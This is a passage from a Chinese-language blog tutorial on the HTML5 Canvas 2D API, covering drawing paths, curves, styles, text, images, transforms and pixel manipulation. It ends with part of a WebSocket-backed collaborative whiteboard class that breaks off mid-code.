class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.acrTo(x1, y1, x2, y2, radius)</span><br></pre></td></tr></table></figure></p><h4 id="2-3-路径"><a href="#2-3-路径" class="headerlink" title="2.3 路径"></a>2.3 路径</h4><p>路径是通过不同颜色和宽度的线段/曲线相连形成的不同形状的店的集合。绘制图形的步骤：①创建路径起点；②使用画图命令画出路径；③封闭路径；④通过描边或填充路径来渲染图形。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath()   新建路径</span><br><span class="line">ctx.moveTo(x,y)   将笔触移动到(x,y)上</span><br><span class="line">ctx.lineTo(x,y)   绘制一条从当前位置到(x,y)的直线</span><br><span class="line">ctx.closePath()   闭合路径</span><br><span class="line">ctx.stroke()      绘制路径</span><br><span class="line">ctx.fill()        填充路径</span><br></pre></td></tr></table></figure></p><h4 id="2-4-贝塞尔曲线"><a href="#2-4-贝塞尔曲线" class="headerlink" title="2.4 贝塞尔曲线"></a>2.4 贝塞尔曲线</h4><p>二次贝塞尔曲线, cplx,cply为一个控制点, x,y为结束点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quadraticCurveTo(cplx, cply, x, y)</span><br></pre></td></tr></table></figure></p><p>三次贝塞尔曲线, cplx,cply为控制点1, cp2x,cp2y为控制点2, x,y为结束点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bezierCurveTo(cplx, cply, cp2x, cp2y, x, y)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/06/Canvas文档/2.png" style="padding-top:20px; max-width: 380px"><br><br></p><h3 id="3-使用样式和颜色"><a href="#3-使用样式和颜色" class="headerlink" title="3. 使用样式和颜色"></a>3. 使用样式和颜色</h3><h4 id="3-1-描边，填充"><a href="#3-1-描边，填充" class="headerlink" title="3.1 描边，填充"></a>3.1 描边，填充</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillStyle = color               设置图形的填充颜色</span><br><span class="line">ctx.strokeStyle = color             设置图形轮廓的颜色</span><br><span class="line">ctx.globalAlpha = transparencyValue 设置canvas里所有图形的透明度</span><br><span class="line"></span><br><span class="line">// 线型</span><br><span class="line">lineWidth = 1                       设置线条宽度      </span><br><span class="line">lineCap = &apos;butt/round/square&apos;       设置线条末端样式</span><br><span class="line">lineJoin = &apos;round/bevel/miter&apos;      设定线条与线条间接合处的样式</span><br><span class="line">miterLimit = 1                      限制两条线相交时交接处最大长度</span><br><span class="line">getLineDash()                       返回当前虚线样式</span><br><span class="line">setLineDash([4, 2])                 设置当前虚线样式，接受一个数组来指定线段与间隙的交替</span><br><span class="line">lineDashOffset = value              设置虚线样式的起始偏移量</span><br></pre></td></tr></table></figure><h4 id="3-2-渐变"><a href="#3-2-渐变" class="headerlink" title="3.2 渐变"></a>3.2 渐变</h4><p>我们可以用线性或径向的渐变来填充或描边。新建一个<code>canvasGradient</code>对象，并且赋给<code>fillStyle或strokeStyle</code>属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 创建canvasGradient对象</span><br><span class="line">var lineargradient = ctx.createLinearGradient(x1, y1, x2, y2);</span><br><span class="line">var radialgradient = ctx.createRadialGradient(x1, y1, r1, x2, y2, r2);</span><br><span class="line"></span><br><span class="line">// 添加任意多个色标</span><br><span class="line">lineargradient.addColorStop(0, &apos;#000&apos;);</span><br><span class="line">lineargradient.addColorStop(1, &apos;#fff&apos;);</span><br><span class="line"></span><br><span class="line">// assign gradients to fill and stroke styles</span><br><span class="line">ctx.fillStyle = lineargradient;</span><br><span class="line">ctx.strokeStyle = lineargradient;</span><br><span class="line"></span><br><span class="line">// draw shapes</span><br></pre></td></tr></table></figure></p><h4 id="3-3-图案样式"><a href="#3-3-图案样式" class="headerlink" title="3.3 图案样式"></a>3.3 图案样式</h4><p>图案的应用和渐变很像，创建出一个pattern后，赋给<code>fillStyle或strokeStyle</code>属性即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src = &apos;someimage.png&apos;;</span><br><span class="line">var ptrn = ctx.createPattern(img, type)</span><br><span class="line">// type可选repeat, repeat-x, repeat-y, no-repeat</span><br></pre></td></tr></table></figure></p><h4 id="3-4-阴影"><a href="#3-4-阴影" class="headerlink" title="3.4 阴影"></a>3.4 阴影</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ctx.shadowOffsetX = float   设定阴影在X轴的延伸距离</span><br><span class="line">ctx.shadowOffsetY = float   设定阴影在Y轴的延伸距离</span><br><span class="line">ctx.shadowBlur    = float   设定阴影的模糊程度</span><br><span class="line">ctx.shadowColor   = color   设定阴影颜色</span><br><span class="line">ctx.font = &apos;123&apos;;</span><br><span class="line">ctx.fillStyle = &apos;#000&apos;;</span><br><span class="line">ctx.fillText(&apos;Sample String&apos;, 5, 30);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="4-文本和图片"><a href="#4-文本和图片" class="headerlink" title="4. 文本和图片"></a>4. 文本和图片</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctx.font = &apos;10px sans-serif&apos;;</span><br><span class="line">ctx.textAlign = &apos;start/end/left/right/center&apos;;</span><br><span class="line">ctx.textBaseline = &apos;top/hanging/middle/alphabetic/ideographic/bottom&apos;;</span><br><span class="line">ctx.direction = &apos;ltr/rtl/inherit&apos;;</span><br><span class="line"></span><br><span class="line">ctx.fillText(text, x, y, maxWdith)    在指定的(x,y)位置填充指定文本，绘制的最大宽度可选</span><br><span class="line">ctx.strokeText(text, x, y, maxWidth)  在指定的(x,y)位置绘制指定文本，绘制的最大宽度可选</span><br><span class="line"></span><br><span class="line">// 预测量文本宽度</span><br><span class="line">var text = ctx.measureText(&apos;foo&apos;);</span><br><span class="line">text.width // 16</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drawImage(image, x, y)                                              绘制图片</span><br><span class="line">drawImage(image, x, y, width, height)                               绘制图片(缩放)</span><br><span class="line">drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight3) 切片</span><br></pre></td></tr></table></figure><p><img src="/2018/10/06/Canvas文档/3.jpg" style="padding-top:20px; max-width: 380px"><br><br></p><h3 id="5-变形"><a href="#5-变形" class="headerlink" title="5. 变形"></a>5. 变形</h3><h4 id="5-1-状态的保存和恢复"><a href="#5-1-状态的保存和恢复" class="headerlink" title="5.1 状态的保存和恢复"></a>5.1 状态的保存和恢复</h4><p>Canvas状态存储在栈中，每当<code>save()</code>方法被调用后，当前的状态就被推送到栈中。你可以调用任意多次<code>save</code>方法，每一次调用<code>restore</code>方法，上一个保存的状态就从栈中弹出，所有设定都恢复。</p><p>一个绘画状态包括：①当前应用的变形(移动、旋转、缩放)；②strokeStyle, fillStyle, globalAlpha, lineWidth, lineCap, lineJoin, miterLimit, shadowOffsetX, shadowOffsetY, shadowBlur, shadowColor, globalCompositeOperation 的值； ③当前的裁切路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.save()    保存canvas状态</span><br><span class="line">ctx.restore() 恢复canvas状态</span><br></pre></td></tr></table></figure></p><h4 id="5-2-移动，旋转，变形，缩放"><a href="#5-2-移动，旋转，变形，缩放" class="headerlink" title="5.2 移动，旋转，变形，缩放"></a>5.2 移动，旋转，变形，缩放</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx.translate(x, y)   [移动]移动canvas和它的原点到一个不同的位置</span><br><span class="line">ctx.rotate(angle)     [旋转]以原点为中心旋转canvas</span><br><span class="line">ctx.scale(x, y)       [缩放]对形状，位图进行缩小或者放大，x, y默认值为1</span><br><span class="line">ctx.transform(m11, m12, m21, m22, dx, dy) [变形]</span><br><span class="line">ctx.transform(水平方向的缩放，水平方向的倾斜偏移，竖直方向的缩放，竖直方向的倾斜偏移，水平方向的移动，竖直方向的移动)</span><br></pre></td></tr></table></figure><p><img src="/2018/10/06/Canvas文档/4.png" style="padding-top:20px; max-width: 380px"></p><p><br></p><h3 id="6-其它"><a href="#6-其它" class="headerlink" title="6. 其它"></a>6. 其它</h3><h4 id="6-1-动画"><a href="#6-1-动画" class="headerlink" title="6.1 动画"></a>6.1 动画</h4><p>保存canvas状态, 清空canvas, 重绘动画帧。<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API/Tutorial/Advanced_animations" target="_blank" rel="noopener">高级动画示例</a></p><h4 id="6-2-颜色选择器"><a href="#6-2-颜色选择器" class="headerlink" title="6.2 颜色选择器"></a>6.2 颜色选择器</h4><p>像素操作: <code>ctx.getImageData(left, top, width, height)</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src = &apos;https://mdn.mozillademos.org/files/5397/rhino.jpg&apos;;</span><br><span class="line">var canvas = document.getElementById(&apos;canvas&apos;);</span><br><span class="line">var ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">img.onload = function() &#123;</span><br><span class="line">  ctx.drawImage(img, 0, 0);</span><br><span class="line">  img.style.display = &apos;none&apos;;</span><br><span class="line">&#125;;</span><br><span class="line">var color = document.getElementById(&apos;color&apos;);</span><br><span class="line">function pick(event) &#123;</span><br><span class="line">  var x = event.layerX;</span><br><span class="line">  var y = event.layerY;</span><br><span class="line">  var pixel = ctx.getImageData(x, y, 1, 1);</span><br><span class="line">  var data = pixel.data;</span><br><span class="line">  var rgba = &apos;rgba(&apos; + data[0] + &apos;,&apos; + data[1] +</span><br><span class="line">             &apos;,&apos; + data[2] + &apos;,&apos; + (data[3] / 255) + &apos;)&apos;;</span><br><span class="line">  color.style.background =  rgba;</span><br><span class="line">  color.textContent = rgba;</span><br><span class="line">&#125;</span><br><span class="line">canvas.addEventListener(&apos;mousemove&apos;, pick);</span><br></pre></td></tr></table></figure></p><h4 id="6-3-图片灰度和反相颜色"><a href="#6-3-图片灰度和反相颜色" class="headerlink" title="6.3 图片灰度和反相颜色"></a>6.3 图片灰度和反相颜色</h4><p>在场景中写入像素数据: <code>ctx.putImageData(myImageData, dx, dy)</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src = &apos;https://mdn.mozillademos.org/files/5397/rhino.jpg&apos;;</span><br><span class="line">img.onload = function() &#123;</span><br><span class="line">  draw(this);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function draw(img) &#123;</span><br><span class="line">  var canvas = document.getElementById(&apos;canvas&apos;);</span><br><span class="line">  var ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class="line">  ctx.drawImage(img, 0, 0);</span><br><span class="line">  img.style.display = &apos;none&apos;;</span><br><span class="line">  var imageData = ctx.getImageData(0,0,canvas.width, canvas.height);</span><br><span class="line">  var data = imageData.data;</span><br><span class="line">    </span><br><span class="line">  var invert = function() &#123;</span><br><span class="line">    for (var i = 0; i &lt; data.length; i += 4) &#123;</span><br><span class="line">      data[i]     = 225 - data[i];     // red</span><br><span class="line">      data[i + 1] = 225 - data[i + 1]; // green</span><br><span class="line">      data[i + 2] = 225 - data[i + 2]; // blue</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.putImageData(imageData, 0, 0);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var grayscale = function() &#123;</span><br><span class="line">    for (var i = 0; i &lt; data.length; i += 4) &#123;</span><br><span class="line">      var avg = (data[i] + data[i +1] + data[i +2]) / 3;</span><br><span class="line">      data[i]     = avg; // red</span><br><span class="line">      data[i + 1] = avg; // green</span><br><span class="line">      data[i + 2] = avg; // blue</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.putImageData(imageData, 0, 0);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var invertbtn = document.getElementById(&apos;invertbtn&apos;);</span><br><span class="line">  invertbtn.addEventListener(&apos;click&apos;, invert);</span><br><span class="line">  var grayscalebtn = document.getElementById(&apos;grayscalebtn&apos;);</span><br><span class="line">  grayscalebtn.addEventListener(&apos;click&apos;, grayscale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="6-4-把canvas保存为图片"><a href="#6-4-把canvas保存为图片" class="headerlink" title="6.4 把canvas保存为图片"></a>6.4 把canvas保存为图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">canvas.toDataURL(&apos;image/png&apos;, quality)        创建一个png图片,0-1的品质量,1最好</span><br><span class="line">canvas.toBlob(callback, type, encoderOptions) 创建一个画布中代表图片的Blob对象</span><br></pre></td></tr></table></figure><h4 id="6-5-websocket实现白板功能"><a href="#6-5-websocket实现白板功能" class="headerlink" title="6.5 websocket实现白板功能"></a>6.5 websocket实现白板功能</h4><ul><li>绘制线条，直线，椭圆，矩形(可选择画笔粗细，线条颜色，填充颜色)</li><li>写字，输入框中输入确定后显示在画布上</li><li>橡皮檫，清空画布</li><li>撤销，恢复功能(再执行最近一次操作)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line">function repaint(ctx, strokes) &#123;</span><br><span class="line">  ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);</span><br><span class="line">  if (strokes === undefined) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  strokes.map((stroke) =&gt; &#123;</span><br><span class="line">    const &#123; strokeColor, width, graphType &#125; = stroke;</span><br><span class="line">    ctx.strokeStyle = strokeColor;</span><br><span class="line">    ctx.lineWidth = width;</span><br><span class="line"></span><br><span class="line">    const startX = stroke.data[0].x;</span><br><span class="line">    const startY = stroke.data[0].y;</span><br><span class="line">    const &#123; x, y &#125; = stroke.data[stroke.data.length - 1];</span><br><span class="line"></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    if (graphType === &apos;pencil&apos;) &#123;</span><br><span class="line">      for (let i = 0; i &lt; stroke.data.length; i++) &#123;</span><br><span class="line">        const prev = stroke.data[i - 1];</span><br><span class="line">        const current = stroke.data[i];</span><br><span class="line">        if (prev !== undefined) &#123;</span><br><span class="line">          ctx.moveTo(prev.x, prev.y);</span><br><span class="line">        &#125;</span><br><span class="line">        ctx.lineTo(current.x, current.y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else if (graphType === &apos;line&apos;) &#123;</span><br><span class="line">      ctx.moveTo(startX, startY);</span><br><span class="line">      ctx.lineTo(x, y);</span><br><span class="line">    &#125; else if (graphType === &apos;circle&apos;) &#123;</span><br><span class="line">      // const radii = Math.sqrt((startX - x) * (startX - x) + (startY - y) * (startY - y));</span><br><span class="line">      // ctx.arc(startX, startY, radii, 0, Math.PI * 2, false);</span><br><span class="line">      // 椭圆</span><br><span class="line">      ctx.save();</span><br><span class="line">      const o1 = (startX + x) / 2;</span><br><span class="line">      const o2 = (startY + y) / 2;</span><br><span class="line">      const a = Math.abs((x - startX) / 2);</span><br><span class="line">      const b = Math.abs((y - startY) / 2);</span><br><span class="line">      const r = (a &gt; b) ? a : b;</span><br><span class="line">      const ratioX = a / r;</span><br><span class="line">      const ratioY = b / r;</span><br><span class="line">      ctx.scale(ratioX, ratioY);</span><br><span class="line">      ctx.arc(o1 / ratioX, o2 / ratioY, r, 0, 2 * Math.PI, false);</span><br><span class="line">      ctx.restore();</span><br><span class="line"></span><br><span class="line">    &#125; else if (graphType === &apos;square&apos;) &#123;</span><br><span class="line">      ctx.moveTo(startX, startY);</span><br><span class="line">      ctx.lineTo(x, startY);</span><br><span class="line">      ctx.lineTo(x, y);</span><br><span class="line">      ctx.lineTo(startX, y);</span><br><span class="line">      ctx.lineTo(startX, startY);</span><br><span class="line">    &#125; else if (graphType === &apos;rubber&apos;) &#123;</span><br><span class="line">      for (let i = 0; i &lt; stroke.data.length; i++) &#123;</span><br><span class="line">        const &#123; x, y &#125; = stroke.data[i];</span><br><span class="line">        // 操作清除像素</span><br><span class="line">        const size = 2;</span><br><span class="line">        ctx.strokeStyle = &apos;#000000&apos;;</span><br><span class="line">        ctx.clearRect(x - size * 10 ,  y - size * 10 , size * 20 , size * 20);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else if (graphType === &apos;text&apos;) &#123;</span><br><span class="line">      ctx.font = &quot;16px Microsoft YaHei&quot;;</span><br><span class="line">      ctx.fillStyle = strokeColor;</span><br><span class="line">      ctx.fillText(stroke.text, startX, startY);</span><br><span class="line">    &#125;</span><br><span class="line">    ctx.stroke();</span><br><span class="line">    ctx.closePath();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">export default class WhiteBoard &#123;</span><br><span class="line">  constructor(options) &#123;</span><br><span class="line">    this.canvas = document.getElementById(&apos;canvas&apos;);</span><br><span class="line">    this.ctx = this.canvas.getContext(&apos;2d&apos;);</span><br><span class="line">    this.isDrawing = false;</span><br><span class="line">    this.strokeColor = &apos;#000&apos;;</span><br><span class="line">    this.lineWidth = 2; // 线的宽度</span><br><span class="line">    this.graphType = &apos;pencil&apos;;</span><br><span class="line">    this.strokes = [];</span><br><span class="line">    this.redo = [];</span><br><span class="line">    this.textSite = &#123;&#125;;</span><br><span class="line">    const &#123; wid, token &#125; = options;</span><br><span class="line">    const ws = `ws://live.ngrok.elitemc.cn:8000/ws/whiteboard-$&#123;wid&#125;?token=$&#123;token&#125;`;</span><br><span class="line">    this.socket = new WebSocket(ws);</span><br><span class="line">    this.init();</span><br><span class="line">  &#125;</span><br><span class="line">  init = () =&gt; &#123;</span><br><span class="line">    const &#123; canvas, ctx &#125; = this;</span><br><span class="line">    canvas.onmousedown = (event) =&gt; &#123;</span><br><span class="line">      this.isDrawing = true;</span><br><span class="line">      const x = event.clientX - canvas.getBoundingClientRect().x;</span><br><span class="line">      const y = event.clientY - canvas.getBoundingClientRect().y;</span><br><span class="line"></span><br><span class="line">      // 在该坐标上设置文本框</span><br><span class="line">      if (this.graphType === &apos;text&apos;) &#123;</span><br><span class="line">        this.showTextBox(x, y);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        this.addPoint(x, y, true);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // 如果是橡皮檫，清空画布，重绘，显示橡皮檫</span><br><span class="line">      if (this.graphType === &apos;rubber&apos;) &#123;</span><br><span class="line">        this.showRubber(x, y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmousemove = (event) =&gt; &#123;</span><br><span class="line">      const x = event.clientX - canvas.getBoundingClientRect().x;</span><br><span class="line">      const y = event.clientY - canvas.getBoundingClientRect().y;</span><br><span class="line"></span><br><span class="line">      if (this.graphType === &apos;text&apos;) &#123;</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line">      // 记录操作,并重绘</span><br><span class="line">      if (this.isDrawing) &#123;</span><br><span class="line">        this.addPoint(x, y);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // 如果是橡皮檫，清空画布，重绘，显示橡皮檫</span><br><span class="line">      if (this.graphType === &apos;rubber&apos;) &#123;</span><br><span class="line">        this.showRubber(x, y);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmouseup = () =&gt; &#123;</span><br><span class="line">      this.isDrawing = false;</span><br><span class="line">      if (this.graphType === &apos;text&apos;) &#123;</span><br><span class="line">        return false;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        this.sendStrokes();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    canvas.onmouseleave = () =&gt; &#123;</span><br><span class="line">      this.isDrawing = false;</span><br><span class="line">      if (this.graphType === &apos;rubber&apos;) &#123;</span><br><span class="line">        // 隐藏橡皮檫</span><br><span class="line">        this.ctx.clearRect(0, 0, canvas.width, canvas.height);</span><br><span class="line">        this.repaint();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  showTextBox = (x, y) =&gt; &#123;</span><br><span class="line">    const textElem = document.getElementById(&apos;text&apos;);</span><br><span class="line">    textElem.style.display = &apos;block&apos;;</span><br><span class="line">    textElem.style.top = y + &apos;px&apos;;</span><br><span class="line">    textElem.style.left = x + &apos;px&apos;;</span><br><span class="line">    this.textSite = &#123; x, y &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  showRubber = (x, y) =&gt; &#123;</span><br><span class="line">    // 如果是橡皮檫，清空画布，重绘，显示橡皮檫</span><br><span class="line">    const &#123; ctx &#125; = this;</span><br><span class="line">    ctx.lineWidth = 1;</span><br><span class="line">    ctx.clearRect(0, 0, canvas.width, canvas.height);</span><br><span class="line">    this.repaint();</span><br><span class="line"></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.strokeStyle = &apos;#000000&apos;;</span><br><span class="line">    const size = 2;</span><br><span class="line">    ctx.moveTo(x - size * 10 , y - size * 10 );</span><br><span class="line">    ctx.lineTo(x + size * 10 , y - size * 10 );</span><br><span class="line">    ctx.lineTo(x + size * 10 , y + size * 10 );</span><br><span class="line">    ctx.lineTo(x - size * 10 , y + size * 10 );</span><br><span class="line">    ctx.lineTo(x - size * 10 , y - size * 10 );</span><br><span class="line">    ctx.stroke();</span><br><span class="line">  &#125;</span><br><span class="line">  sendStrokes = () =&gt; &#123;</span><br><span 